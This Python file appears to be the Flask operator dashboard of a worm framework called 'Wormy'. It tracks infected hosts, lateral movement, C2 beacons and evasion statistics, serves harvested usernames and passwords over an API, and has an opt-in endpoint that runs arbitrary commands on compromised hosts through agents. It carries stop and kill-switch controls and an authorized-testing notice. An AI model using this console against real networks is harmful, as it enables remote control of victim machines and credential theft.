"""
Wormy — Web Dashboard.

Flask-based monitoring interface: real-time KPIs, propagation charts,
network topology, host inspection and a live activity feed.

Safety by design:
- Binds to 127.0.0.1 by default (never expose the control plane to the
  network; override explicitly with WORMY_DASHBOARD_HOST if you must).
- Read-only monitoring is always available.
- Engine STOP is always available (safety control).
- Command execution is disabled unless WORMY_DASHBOARD_COMMANDS=1.
"""

import logging
import os
import threading
from datetime import datetime
from typing import Dict, List

from utils.logger import logger

# ── Silence Flask/Werkzeug access logs (they pollute the Rich live TUI) ──
logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask.app").setLevel(logging.ERROR)

try:
    from flask import Flask, jsonify, render_template_string, request

    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    logger.warning("Flask not installed: pip install flask")

DEFAULT_HOST = os.environ.get("WORMY_DASHBOARD_HOST", "127.0.0.1")
COMMANDS_ENABLED = os.environ.get("WORMY_DASHBOARD_COMMANDS", "").strip().lower() in (
    "1",
    "yes",
    "true",
)


def _safe_str(value) -> str:
    """Best-effort string coercion for API payloads."""
    if value is None:
        return ""
    if isinstance(value, (dict, list)):
        import json

        try:
            return json.dumps(value, default=str)
        except Exception:  # noqa: BLE001 — display fallback only
            return str(value)
    return str(value)


class WebDashboard:
    """Monitoring web UI for a live WormCore instance.

    The dashboard is read-only by default. Two safety endpoints are
    always available (``POST /api/stop`` and ``POST /api/kill-switch``)
    so an operator can halt the engine from the browser.
    """

    def __init__(self, worm_core=None, host: str = None, port: int = 5000):
        self.worm = worm_core
        self.host = host or DEFAULT_HOST
        self.port = port
        self.app = None
        self._thread = None
        self._server = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available, Web Dashboard disabled")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(
            f"Web Dashboard initialized on {self.host}:{self.port} (commands: {'on' if COMMANDS_ENABLED else 'off'})"
        )

    # ── routes ───────────────────────────────────────────────────────

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(self._get_dashboard_html())

        @self.app.route("/api/status")
        def api_status():
            return jsonify(self._get_status_data())

        @self.app.route("/api/hosts")
        def api_hosts():
            return jsonify(self._get_hosts_data())

        @self.app.route("/api/activity")
        def api_activity():
            limit = max(1, min(request.args.get("limit", 50, type=int), 500))
            return jsonify(self._get_activity_data(limit))

        @self.app.route("/api/vulnerabilities")
        def api_vulnerabilities():
            return jsonify(self._get_vulnerabilities_data())

        @self.app.route("/api/credentials")
        def api_credentials():
            return jsonify(self._get_credentials_data())

        @self.app.route("/api/topology")
        def api_topology():
            return jsonify(self._get_topology_data())

        @self.app.route("/api/stats")
        def api_stats():
            return jsonify(self._get_stats_data())

        # ── safety controls (always available) ───────────────────────

        @self.app.route("/api/stop", methods=["POST"])
        def api_stop():
            if self.worm is None:
                return jsonify({"ok": False, "error": "engine not available"}), 503
            try:
                self.worm.stop()
                logger.info("Stop requested from web dashboard")
                return jsonify({"ok": True, "status": "stop_requested"})
            except Exception as e:  # noqa: BLE001 — surface the failure to the UI
                return jsonify({"ok": False, "error": _safe_str(e)}), 500

        @self.app.route("/api/kill-switch", methods=["POST"])
        def api_kill_switch():
            if self.worm is None:
                return jsonify({"ok": False, "error": "engine not available"}), 503
            code = (request.json or {}).get("code", "")
            if not code:
                return jsonify({"ok": False, "error": "kill switch code required"}), 400
            try:
                self.worm.activate_kill_switch(code)
                return jsonify({"ok": True, "status": "kill_switch_activated"})
            except Exception as e:  # noqa: BLE001
                return jsonify({"ok": False, "error": _safe_str(e)}), 400

        # ── command execution (opt-in) ───────────────────────────────

        @self.app.route("/api/command", methods=["POST"])
        def api_command():
            if not COMMANDS_ENABLED:
                return (
                    jsonify(
                        {
                            "ok": False,
                            "error": "command execution is disabled; start the dashboard "
                            "with WORMY_DASHBOARD_COMMANDS=1 to enable it",
                        }
                    ),
                    403,
                )
            if self.worm is None or not getattr(self.worm, "agent_controller", None):
                return jsonify({"ok": False, "error": "agent controller unavailable"}), 503
            data = request.json or {}
            host_ip = (data.get("host_ip") or "").strip()
            command = (data.get("command") or "").strip()
            if not host_ip or not command:
                return jsonify({"ok": False, "error": "host_ip and command are required"}), 400
            agent = self.worm.agent_controller.find_by_ip(host_ip)
            if agent is None:
                return jsonify({"ok": False, "error": f"no registered agent for {host_ip}"}), 404
            try:
                rc, output = self.worm.agent_controller.execute_now(agent.agent_id, command)
                return jsonify(
                    {
                        "ok": True,
                        "host": host_ip,
                        "agent": agent.agent_id,
                        "rc": rc,
                        "output": _safe_str(output),
                    }
                )
            except Exception as e:  # noqa: BLE001
                return jsonify({"ok": False, "error": _safe_str(e)}), 500

    # ── data providers ───────────────────────────────────────────────

    def _get_status_data(self) -> Dict:
        if not self.worm:
            return {"error": "WormCore not available"}
        from worm_core._version import __version__

        stats = self.worm.stats
        lateral = stats.get("lateral_movements", 0)
        lateral_ok = stats.get("lateral_success", 0)
        bf = stats.get("brute_force_attempts", 0)
        bf_ok = stats.get("brute_force_successes", 0)
        return {
            "version": __version__,
            "running": self.worm.running,
            "dry_run": getattr(self.worm, "dry_run", False),
            "infected_hosts": len(self.worm.infected_hosts),
            "failed_targets": len(self.worm.failed_targets),
            "total_discovered": stats.get("total_hosts_discovered", 0),
            "vulnerabilities": stats.get("vulnerabilities_found", 0),
            "exploit_chains": stats.get("exploit_chains_built", 0),
            "lateral_movements": f"{lateral_ok}/{lateral}",
            "brute_force": f"{bf_ok}/{bf}",
            "credentials": stats.get("credentials_discovered", 0),
            "c2_beacons": stats.get("c2_beacons", 0),
            "polymorphic_mutations": stats.get("polymorphic_mutations", 0),
            "start_time": self.worm.start_time.isoformat() if self.worm.start_time else None,
            "targets": getattr(
                getattr(getattr(self.worm, "config", None), "network", None), "target_ranges", []
            )
            or [],
        }

    def _get_hosts_data(self) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []
        hosts = []
        for ip, host_state in self.worm.host_monitor.hosts.items():
            hosts.append(
                {
                    "ip": ip,
                    "os": _safe_str(host_state.os_guess),
                    "status": _safe_str(host_state.status),
                    "health": host_state.health_score,
                    "detection_risk": host_state.detection_risk,
                    "cpu": host_state.cpu_usage,
                    "memory": host_state.memory_usage,
                    "payload_variant": _safe_str(host_state.payload_variant),
                    "infected_at": (
                        host_state.infected_at.isoformat() if host_state.infected_at else None
                    ),
                    "last_beacon": (
                        host_state.last_beacon.isoformat() if host_state.last_beacon else None
                    ),
                    "activities": len(host_state.activity_log),
                    "credentials_found": len(host_state.credentials_found),
                    "lateral_movements": len(host_state.lateral_movement_history),
                }
            )
        return hosts

    def _get_activity_data(self, limit: int = 50) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []
        return self.worm.host_monitor.get_activity_feed(limit=limit)

    def _get_vulnerabilities_data(self) -> List[Dict]:
        vulns = []
        if not self.worm:
            return vulns
        for host in self.worm.scan_results:
            for v in host.get("vulnerabilities", []):
                vulns.append(
                    {
                        "host": _safe_str(host.get("ip", "")),
                        "cve": _safe_str(v.get("cve", "N/A")),
                        "name": _safe_str(v.get("name", "Unknown")),
                        "severity": _safe_str(v.get("severity", "UNKNOWN")).upper(),
                        "cvss": v.get("cvss", 0),
                        "description": _safe_str(v.get("description", "")),
                    }
                )
        return vulns

    def _get_credentials_data(self) -> List[Dict]:
        if not self.worm or not self.worm.cred_manager:
            return []
        creds = self.worm.cred_manager.get_discovered_credentials()
        return [
            {"username": _safe_str(u), "password": _safe_str(p), "source": "discovered"}
            for u, p in creds
        ]

    def _get_topology_data(self) -> Dict:
        nodes, edges = [], []
        if not self.worm:
            return {"nodes": [], "edges": []}
        for host in self.worm.scan_results:
            ip = host.get("ip", "")
            is_infected = ip in self.worm.infected_hosts
            is_failed = ip in self.worm.failed_targets
            status = "infected" if is_infected else ("failed" if is_failed else "discovered")
            nodes.append(
                {
                    "id": ip,
                    "label": ip,
                    "status": status,
                    "os": _safe_str(host.get("os_guess", "Unknown")),
                    "ports": host.get("open_ports", []),
                }
            )
        if self.worm.host_monitor:
            for ip, host_state in self.worm.host_monitor.hosts.items():
                for lm in host_state.lateral_movement_history:
                    edges.append(
                        {
                            "from": ip,
                            "to": _safe_str(lm.get("target", "")),
                            "label": _safe_str(lm.get("technique", "")),
                            "success": bool(lm.get("success", False)),
                        }
                    )
        return {"nodes": nodes, "edges": edges}

    def _get_stats_data(self) -> Dict:
        if not self.worm:
            return {}
        stats = {**self.worm.stats}
        if self.worm.start_time:
            stats["start_time"] = self.worm.start_time.isoformat()
        if self.worm.stats.get("end_time"):
            stats["end_time"] = self.worm.stats["end_time"].isoformat()
        if self.worm.host_monitor:
            stats["host_monitor"] = self.worm.host_monitor.get_statistics()
        if self.worm.ids_evasion:
            stats["evasion"] = self.worm.ids_evasion.get_statistics()
        return stats

    def _get_dashboard_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wormy — Operations Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<style>
:root{
  --bg:#0a0e14;--surface:#11161f;--surface2:#161d29;--border:#232c3b;
  --text:#e6edf3;--muted:#8b98a9;--accent:#2dd4a7;--danger:#f0564a;
  --warn:#e8b33e;--info:#4a9df0;--purple:#a78bfa;--mono:'SF Mono','Fira Code',ui-monospace,monospace;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:14px}
.topbar{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;align-items:center;padding:12px 24px;border-bottom:1px solid var(--border);background:rgba(17,22,31,.92);backdrop-filter:blur(8px)}
.brand{display:flex;align-items:center;gap:10px}
.brand .logo{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,var(--accent),#0e7490);display:grid;place-items:center;font-weight:800;color:#04121b;font-size:15px}
.brand h1{font-size:1rem;font-weight:650;letter-spacing:-.01em}
.chip{padding:3px 9px;border-radius:9999px;font-size:.68rem;font-weight:600;text-transform:uppercase;letter-spacing:.06em;border:1px solid}
.chip-ver{color:var(--muted);border-color:var(--border)}
.chip-live{color:var(--danger);border-color:#f0564a55;background:#f0564a15}
.chip-dry{color:var(--info);border-color:#4a9df055;background:#4a9df015}
.chip-run{color:var(--accent);border-color:#2dd4a755;background:#2dd4a715}
.chip-stop{color:var(--warn);border-color:#e8b33e55;background:#e8b33e15}
.topbar-right{display:flex;align-items:center;gap:9px}
.clock{font-family:var(--mono);font-size:.75rem;color:var(--muted)}
.btn{background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:6px 13px;border-radius:7px;cursor:pointer;font-size:.78rem;font-weight:500;transition:all .15s}
.btn:hover{border-color:var(--accent);color:var(--accent)}
.btn-danger{border-color:#f0564a66;color:var(--danger)}
.btn-danger:hover{background:#f0564a22;border-color:var(--danger);color:var(--danger)}
.container{max-width:1440px;margin:0 auto;padding:22px 24px 60px}
.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:11px;margin-bottom:18px}
.kpi{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 16px;position:relative;overflow:hidden}
.kpi::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--kc,var(--accent))}
.kpi-label{font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px}
.kpi-value{font-size:1.45rem;font-weight:650;font-family:var(--mono)}
.grid-charts{display:grid;grid-template-columns:2fr 1fr 1fr;gap:11px;margin-bottom:18px}
@media(max-width:1000px){.grid-charts{grid-template-columns:1fr}}
.panel{background:var(--surface);border:1px solid var(--border);border-radius:10px;margin-bottom:11px}
.panel-head{padding:11px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
.panel-head h2{font-size:.8rem;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
.panel-head .hint{font-size:.7rem;color:var(--muted);font-family:var(--mono)}
.panel-body{padding:14px 16px}
.chart-box{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px}
.chart-box h3{font-size:.8rem;font-weight:600;margin-bottom:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}
table{width:100%;border-collapse:collapse;font-size:.8rem}
th{text-align:left;padding:8px 12px;color:var(--muted);font-weight:600;border-bottom:1px solid var(--border);text-transform:uppercase;letter-spacing:.06em;font-size:.66rem}
td{padding:8px 12px;border-bottom:1px solid var(--border)}
tr:last-child td{border-bottom:none}
tbody tr:hover{background:var(--surface2)}
.mono{font-family:var(--mono);font-size:.74rem}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:7px}
.dot-green{background:var(--accent)}.dot-red{background:var(--danger)}.dot-blue{background:var(--info)}
.sev{padding:2px 8px;border-radius:5px;font-size:.66rem;font-weight:600}
.sev-CRITICAL{background:#f0564a22;color:var(--danger)}
.sev-HIGH{background:#f9731622;color:#f97316}
.sev-MEDIUM{background:#e8b33e22;color:var(--warn)}
.sev-LOW{background:#2dd4a722;color:var(--accent)}
.feed{display:flex;gap:11px;padding:7px 0;border-bottom:1px solid var(--border);font-size:.78rem;align-items:baseline}
.feed:last-child{border-bottom:none}
.feed-time{color:var(--muted);font-family:var(--mono);font-size:.7rem;min-width:60px}
.feed-type{padding:2px 8px;border-radius:5px;background:var(--surface2);color:var(--accent);font-size:.66rem;font-weight:600;min-width:92px;text-align:center}
.feed-host{color:var(--info);font-family:var(--mono);font-size:.72rem;min-width:120px}
.feed-details{color:var(--muted);word-break:break-word}
.empty{color:var(--muted);text-align:center;padding:26px;font-size:.8rem}
.two-col{display:grid;grid-template-columns:1fr 1fr;gap:11px}
@media(max-width:1000px){.two-col{grid-template-columns:1fr}}
#topo-svg{width:100%;height:340px}
.topo-legend{display:flex;gap:16px;font-size:.7rem;color:var(--muted);padding:0 16px 12px}
.topo-legend span{display:flex;align-items:center;gap:5px}
#toast{position:fixed;bottom:22px;right:22px;z-index:100;display:none;max-width:420px;background:var(--surface2);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:9px;padding:13px 17px;font-size:.8rem;box-shadow:0 8px 30px #0009}
#toast.err{border-left-color:var(--danger)}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
.footer{display:flex;justify-content:space-between;padding:14px 24px;border-top:1px solid var(--border);color:var(--muted);font-size:.7rem;flex-wrap:wrap;gap:8px}
dialog{background:var(--surface);border:1px solid var(--border);border-radius:12px;color:var(--text);padding:0;max-width:560px;width:92vw}
dialog::backdrop{background:#000a}
.dlg-head{padding:15px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-weight:600}
.dlg-body{padding:16px 18px;max-height:60vh;overflow:auto;font-size:.82rem;line-height:1.65}
.dlg-body .row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px dashed var(--border)}
.dlg-body .row span:first-child{color:var(--muted)}
</style>
</head>
<body>
<div class="topbar">
  <div class="brand">
    <div class="logo">W</div><h1>Wormy <span id="ver" class="chip chip-ver" style="margin-left:6px">—</span></h1>
    <span id="mode-chip" class="chip chip-dry">DRY-RUN</span>
    <span id="status-badge" class="chip chip-stop">IDLE</span>
  </div>
  <div class="topbar-right">
    <span class="clock" id="clock"></span>
    <button class="btn" id="pause-btn" onclick="togglePause()">Pause</button>
    <button class="btn btn-danger" onclick="stopEngine()">■ Stop engine</button>
  </div>
</div>
<div class="container">
  <div class="kpis" id="kpis">
    <div class="kpi" style="--kc:var(--accent)"><div class="kpi-label">Infected</div><div class="kpi-value" id="k-infected">0</div></div>
    <div class="kpi" style="--kc:var(--info)"><div class="kpi-label">Discovered</div><div class="kpi-value" id="k-discovered">0</div></div>
    <div class="kpi" style="--kc:var(--danger)"><div class="kpi-label">Failed</div><div class="kpi-value" id="k-failed">0</div></div>
    <div class="kpi" style="--kc:var(--danger)"><div class="kpi-label">Vulnerabilities</div><div class="kpi-value" id="k-vulns">0</div></div>
    <div class="kpi" style="--kc:var(--purple)"><div class="kpi-label">Exploit chains</div><div class="kpi-value" id="k-chains">0</div></div>
    <div class="kpi" style="--kc:var(--warn)"><div class="kpi-label">Lateral moves</div><div class="kpi-value" id="k-lateral" style="font-size:1.05rem">0/0</div></div>
    <div class="kpi" style="--kc:var(--warn)"><div class="kpi-label">Credentials</div><div class="kpi-value" id="k-creds">0</div></div>
    <div class="kpi" style="--kc:var(--accent)"><div class="kpi-label">C2 beacons</div><div class="kpi-value" id="k-c2">0</div></div>
  </div>
  <div class="grid-charts">
    <div class="chart-box"><h3>Propagation timeline</h3><canvas id="progressChart" height="150"></canvas></div>
    <div class="chart-box"><h3>Host status</h3><canvas id="hostChart" height="150"></canvas></div>
    <div class="chart-box"><h3>Vulnerability severity</h3><canvas id="vulnChart" height="150"></canvas></div>
  </div>
  <div class="panel">
    <div class="panel-head"><h2>Network topology</h2><span class="hint" id="topo-count">0 nodes</span></div>
    <svg id="topo-svg" viewBox="0 0 900 340" preserveAspectRatio="xMidYMid meet"></svg>
    <div class="topo-legend">
      <span><span class="dot dot-green"></span>infected</span>
      <span><span class="dot dot-blue"></span>discovered</span>
      <span><span class="dot dot-red"></span>failed</span>
      <span style="margin-left:auto">edges = lateral movement (solid: success · dashed: failed)</span>
    </div>
  </div>
  <div class="panel">
    <div class="panel-head"><h2>Hosts</h2><span class="hint">click a row for details</span></div>
    <div style="overflow-x:auto"><table><thead><tr><th>IP</th><th>OS</th><th>Status</th><th>Health</th><th>Risk</th><th>Payload</th><th>Events</th><th>Creds</th><th>Lat.</th></tr></thead><tbody id="hosts-tbody"></tbody></table></div>
  </div>
  <div class="two-col">
    <div class="panel">
      <div class="panel-head"><h2>Vulnerabilities</h2><span class="hint" id="vuln-count"></span></div>
      <div style="overflow-x:auto;max-height:360px"><table><thead><tr><th>Host</th><th>Name</th><th>Severity</th><th>CVSS</th><th>CVE</th></tr></thead><tbody id="vulns-tbody"></tbody></table></div>
    </div>
    <div class="panel">
      <div class="panel-head"><h2>Activity</h2><span class="hint">live</span></div>
      <div class="panel-body" id="activity-feed" style="max-height:360px;overflow-y:auto"></div>
    </div>
  </div>
</div>
<div id="toast"></div>
<dialog id="host-dlg"><div class="dlg-head"><span id="dlg-title"></span><button class="btn" onclick="document.getElementById('host-dlg').close()">✕</button></div><div class="dlg-body" id="dlg-body"></div></dialog>
<div class="footer">
  <span>Authorized use only — run against networks you own or have written permission to test.</span>
  <span id="targets-label"></span>
</div>
<script>
'use strict';
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
let paused = false, charts = {}, progressHistory = [], lastErrorShown = 0;

function toast(msg, isErr){
  const t = document.getElementById('toast');
  t.textContent = msg; t.className = isErr ? 'err' : ''; t.style.display = 'block';
  clearTimeout(t._h); t._h = setTimeout(() => t.style.display = 'none', 4000);
}
function togglePause(){
  paused = !paused;
  document.getElementById('pause-btn').textContent = paused ? 'Resume' : 'Pause';
}
function stopEngine(){
  if(!confirm('Stop the propagation engine? (cooperative stop — same as the CLI stop command)')) return;
  fetch('/api/stop', {method:'POST'}).then(r=>r.json()).then(d => {
    d.ok ? toast('Stop requested — engine is winding down') : toast('Stop failed: ' + d.error, true);
  }).catch(e => toast('Stop failed: ' + e, true));
}
async function jget(url){
  const r = await fetch(url);
  if(!r.ok) throw new Error(url + ' -> HTTP ' + r.status);
  return r.json();
}
function setClock(){ document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }

function initCharts(){
  if(typeof Chart === 'undefined'){ document.querySelectorAll('.chart-box').forEach(b => b.innerHTML += '<p class="empty">charts unavailable (offline)</p>'); return; }
  const axis = {ticks:{color:'#8b98a9'},grid:{color:'#232c3b'}};
  charts.host = new Chart(document.getElementById('hostChart'), {type:'doughnut',
    data:{labels:['Infected','Discovered','Failed'],datasets:[{data:[0,0,0],backgroundColor:['#2dd4a7','#4a9df0','#f0564a'],borderWidth:0}]},
    options:{cutout:'62%',plugins:{legend:{position:'bottom',labels:{color:'#8b98a9',padding:14,font:{size:10}}}}}});
  charts.progress = new Chart(document.getElementById('progressChart'), {type:'line',
    data:{labels:[],datasets:[{label:'Infected',data:[],borderColor:'#2dd4a7',backgroundColor:'#2dd4a718',fill:true,tension:.4,pointRadius:0,borderWidth:2}]},
    options:{scales:{x:{display:false},y:{beginAtZero:true,...axis}},plugins:{legend:{display:false}}}});
  charts.vuln = new Chart(document.getElementById('vulnChart'), {type:'bar',
    data:{labels:['Critical','High','Medium','Low'],datasets:[{data:[0,0,0,0],backgroundColor:['#f0564a','#f97316','#e8b33e','#2dd4a7'],borderRadius:5,barPercentage:.6}]},
    options:{scales:{x:{...axis,ticks:{color:'#8b98a9',font:{size:10}}},y:{beginAtZero:true,...axis}},plugins:{legend:{display:false}}}});
}

function refreshStatus(){
  jget('/api/status').then(d => {
    if(d.error){ toast('Engine offline: ' + d.error, true); return; }
    document.getElementById('ver').textContent = 'v' + d.version;
    const b = document.getElementById('status-badge');
    b.textContent = d.running ? 'RUNNING' : 'IDLE';
    b.className = 'chip ' + (d.running ? 'chip-run' : 'chip-stop');
    const m = document.getElementById('mode-chip');
    m.textContent = d.dry_run ? 'DRY-RUN' : 'LIVE';
    m.className = 'chip ' + (d.dry_run ? 'chip-dry' : 'chip-live');
    document.getElementById('k-infected').textContent = d.infected_hosts ?? 0;
    document.getElementById('k-discovered').textContent = d.total_discovered ?? 0;
    document.getElementById('k-failed').textContent = d.failed_targets ?? 0;
    document.getElementById('k-vulns').textContent = d.vulnerabilities ?? 0;
    document.getElementById('k-chains').textContent = d.exploit_chains ?? 0;
    document.getElementById('k-lateral').textContent = d.lateral_movements ?? '0/0';
    document.getElementById('k-creds').textContent = d.credentials ?? 0;
    document.getElementById('k-c2').textContent = d.c2_beacons ?? 0;
    document.getElementById('targets-label').textContent = (d.targets && d.targets.length) ? ('targets: ' + d.targets.join(', ')) : '';
    const discovered = (d.total_discovered ?? 0) - (d.infected_hosts ?? 0) - (d.failed_targets ?? 0);
    if(charts.host){ charts.host.data.datasets[0].data = [d.infected_hosts ?? 0, Math.max(discovered,0), d.failed_targets ?? 0]; charts.host.update('none'); }
    if(charts.progress){
      progressHistory.push(d.infected_hosts ?? 0);
      if(progressHistory.length > 40) progressHistory.shift();
      charts.progress.data.labels = progressHistory.map((_,i)=>i);
      charts.progress.data.datasets[0].data = [...progressHistory];
      charts.progress.update('none');
    }
  }).catch(e => { if(Date.now() - lastErrorShown > 15000){ toast('API error: ' + e.message, true); lastErrorShown = Date.now(); } });
}

function loadHosts(){
  jget('/api/hosts').then(h => {
    const t = document.getElementById('hosts-tbody');
    if(!h.length){ t.innerHTML = '<tr><td colspan="9" class="empty">No hosts yet — run a scan</td></tr>'; return; }
    t.innerHTML = h.map(x => {
      const dot = x.status === 'infected' ? 'green' : x.status === 'failed' ? 'red' : 'blue';
      const row = `<tr data-ip="${esc(x.ip)}" style="cursor:pointer">
        <td class="mono"><span class="dot dot-${dot}"></span>${esc(x.ip)}</td>
        <td style="color:var(--muted)">${esc(x.os)}</td>
        <td style="text-transform:capitalize">${esc(x.status)}</td>
        <td class="mono">${(x.health ?? 0).toFixed ? x.health.toFixed(0) + '%' : '—'}</td>
        <td class="mono">${(x.detection_risk ?? 0).toFixed ? x.detection_risk.toFixed(0) + '%' : '—'}</td>
        <td class="mono">${esc(x.payload_variant)}</td>
        <td class="mono">${x.activities ?? 0}</td>
        <td class="mono">${x.credentials_found ?? 0}</td>
        <td class="mono">${x.lateral_movements ?? 0}</td></tr>`;
      return row;
    }).join('');
    t.querySelectorAll('tr').forEach(r => r.onclick = () => showHost(r.dataset.ip));
  }).catch(()=>{});
}

function showHost(ip){
  const host = (window._hostsCache || []).find(x => x.ip === ip);
  if(!host) return;
  document.getElementById('dlg-title').textContent = 'Host ' + ip;
  const row = (k,v) => `<div class="row"><span>${esc(k)}</span><span>${esc(v)}</span></div>`;
  document.getElementById('dlg-body').innerHTML =
    row('OS guess', host.os || '—') + row('Status', host.status || '—') +
    row('Health', host.health ?? '—') + row('Detection risk', host.detection_risk ?? '—') +
    row('CPU / Memory', (host.cpu ?? '—') + ' / ' + (host.memory ?? '—')) +
    row('Payload variant', host.payload_variant || '—') +
    row('Infected at', host.infected_at || '—') + row('Last beacon', host.last_beacon || '—') +
    row('Activity events', host.activities ?? 0) + row('Credentials found', host.credentials_found ?? 0) +
    row('Lateral movements', host.lateral_movements ?? 0);
  document.getElementById('host-dlg').showModal();
}

function loadVulns(){
  jget('/api/vulnerabilities').then(v => {
    const t = document.getElementById('vulns-tbody');
    document.getElementById('vuln-count').textContent = v.length ? v.length + ' findings' : '';
    if(!v.length){ t.innerHTML = '<tr><td colspan="5" class="empty">No vulnerabilities</td></tr>'; if(charts.vuln){charts.vuln.data.datasets[0].data=[0,0,0,0];charts.vuln.update('none');} return; }
    const sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
    v.forEach(x => { if(sc[x.severity] !== undefined) sc[x.severity]++; });
    if(charts.vuln){ charts.vuln.data.datasets[0].data = [sc.CRITICAL,sc.HIGH,sc.MEDIUM,sc.LOW]; charts.vuln.update('none'); }
    t.innerHTML = v.slice(0,25).map(x => `<tr>
      <td class="mono">${esc(x.host)}</td><td>${esc(x.name)}</td>
      <td><span class="sev sev-${esc(x.severity)}">${esc(x.severity)}</span></td>
      <td class="mono">${esc(x.cvss)}</td><td class="mono" style="color:var(--muted)">${esc(x.cve)}</td></tr>`).join('');
  }).catch(()=>{});
}

function loadActivity(){
  jget('/api/activity?limit=50').then(a => {
    const f = document.getElementById('activity-feed');
    if(!a.length){ f.innerHTML = '<p class="empty">No activity yet</p>'; return; }
    f.innerHTML = a.slice(0,40).map(x => `<div class="feed">
      <span class="feed-time">${esc((x.timestamp || '').slice(11,19))}</span>
      <span class="feed-type">${esc(x.type || '')}</span>
      <span class="feed-host">${esc(x.host_ip || '')}</span>
      <span class="feed-details">${esc(x.details || '')}</span></div>`).join('');
  }).catch(()=>{});
}

function drawTopology(topo){
  const svg = document.getElementById('topo-svg');
  const nodes = topo.nodes || [], edges = topo.edges || [];
  document.getElementById('topo-count').textContent = nodes.length + ' nodes · ' + edges.length + ' edges';
  if(!nodes.length){ svg.innerHTML = '<text x="450" y="170" fill="#8b98a9" text-anchor="middle" font-size="13">No hosts discovered yet</text>'; return; }
  const cx = 450, cy = 170, R = Math.min(150, 60 + nodes.length * 9);
  const pos = {};
  nodes.forEach((n, i) => { const ang = (2 * Math.PI * i) / nodes.length - Math.PI / 2; pos[n.id] = {x: cx + R * Math.cos(ang), y: cy + R * Math.sin(ang)}; });
  let out = '';
  edges.forEach(e => {
    const a = pos[e.from], b = pos[e.to];
    if(!a || !b) return;
    out += `<line x1="${a.x}" y1="${a.y}" x2="${b.x}" y2="${b.y}" stroke="${e.success ? '#2dd4a755' : '#f0564a55'}" stroke-width="1.6" ${e.success ? '' : 'stroke-dasharray="5 4"'}/>`;
  });
  nodes.forEach(n => {
    const p = pos[n.id]; if(!p) return;
    const color = n.status === 'infected' ? '#2dd4a7' : n.status === 'failed' ? '#f0564a' : '#4a9df0';
    const ports = (n.ports || []).length ? ' · ' + n.ports.join(',') : '';
    out += `<g style="cursor:default">
      <circle cx="${p.x}" cy="${p.y}" r="17" fill="#11161f" stroke="${color}" stroke-width="2.4"/>
      <circle cx="${p.x}" cy="${p.y}" r="5" fill="${color}"/>
      <text x="${p.x}" y="${p.y + 33}" fill="#8b98a9" text-anchor="middle" font-size="10" font-family="monospace">${esc(n.id)}</text>
      <title>${esc(n.id)} — ${esc(n.status)} — ${esc(n.os)}${esc(ports)}</title></g>`;
  });
  svg.innerHTML = out;
}

function refreshAll(){
  setClock();
  if(paused) return;  // auto-refresh suspended via Pause button
  refreshStatus();
  loadHosts();
  loadVulns();
  loadActivity();
  jget('/api/topology').then(drawTopology).catch(()=>{});
}

window.onload = () => {
  initCharts();
  refreshAll();
  jget('/api/hosts').then(h => window._hostsCache = h).catch(()=>{});
  setInterval(refreshAll, 5000);
  setInterval(() => jget('/api/hosts').then(h => window._hostsCache = h).catch(()=>{}), 5000);
};
</script>
</body>
</html>
"""

    # ── lifecycle ────────────────────────────────────────────────────

    def run(self, debug: bool = False):
        if not FLASK_AVAILABLE:
            return
        from werkzeug.serving import make_server

        logger.info(f"Starting Web Dashboard on {self.host}:{self.port}")
        # make_server instead of app.run so shutdown() can stop the listener
        # (previously the dashboard kept serving after a kill switch).
        self._server = make_server(self.host, self.port, self.app, threaded=True)
        self._server.serve_forever()

    def stop(self):
        server = self._server
        if server is not None:
            try:
                server.shutdown()
                logger.info("Web Dashboard stopped")
            except Exception as e:  # noqa: BLE001 — shutdown must never raise
                logger.debug(f"Web Dashboard stop error: {e}")

    def run_background(self):
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True, name="web-dashboard")
        self._thread.start()
        logger.info(f"Web Dashboard running in background on {self.host}:{self.port}")
        return self._thread
